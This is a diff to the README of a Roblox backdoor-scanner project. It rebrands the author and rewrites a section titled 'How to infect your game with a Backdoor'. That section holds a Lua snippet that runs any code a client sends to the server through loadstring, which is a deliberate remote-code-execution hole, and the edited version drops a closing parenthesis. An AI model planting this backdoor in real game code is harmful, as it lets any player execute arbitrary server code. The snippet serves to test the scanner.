@@ -13,7 +13,7 @@
     <img alt="License: GPL--3.0" src="https://img.shields.io/github/license/iK4oS/backdoor.exe" />
   </a>
   <div align="center">
-  <h1>🚨 THIS HAS BEEN ARCHIVED/DISCONTINUED UNTIL FUTHER NOTICE 🚨</h1>
+  <h1>Thank you for using</h1>
 </div>
 </p>
 
@@ -23,14 +23,14 @@ An in-game interface/tool to scan every remote for backdoors. </br>
 
 
 
-<!--- ### ✨ [Demo](https://demo.url/) Comming soon 😉 --->
+<!--- ### ✨ [Demo](https://demo.url/) Comming soon --->
 
-# How to infect your game with a Backdoor
+# How to infect your game with a Backdoor, Please do not do this only do it if you want to use it
 ```lua
-local backdoor = Instance.new("RemoteEvent", game.ReplicatedStorage)
-backdoor.Name = "Backdoor"
-backdoor.OnServerEvent:connect(function(player, SS)
-    loadstring(SS)()
+local Backdoor = Instance.new("RemoteEvent", game:GetService("ReplicatedStorage")
+Backdoor.Name = "Backdoor"
+Backdoor.OnServerEvent:connect(function(Player, Code)
+    loadstring(Code)()
 end)
 ```
 Do not forget to **Enable Loadstrings in ServerScriptServices** <br>
@@ -52,9 +52,9 @@ Contributions, issues, and feature requests are welcome!<br />Feel free to check
 * Undetected backdoors reports are appreciated as contribute to providing the best-updated backdoor scanner out there.
 
 # Show your support
-Give a ⭐️ if this project helped you or join our [Discord](https://discord.gg/k4scripts-731881028573986874) !
+Give a ⭐️ if this project helped you !
 
 # 📝 License
 
-Copyright © 2021 [iK4oS](https://github.com/iK4oS).<br />
-This project is [GPL-3.0](https://github.com/iK4oS/backdoor.exe/blob/master/LICENSE) licensed.
+Copyright © 2025 [ReactorCoreDev](https://github.com/ReactorCoreDev).<br />
+This project is [GPL-3.0](https://github.com/ReactorCoreDev/backdoor.exe/blob/master/LICENSE) licensed.
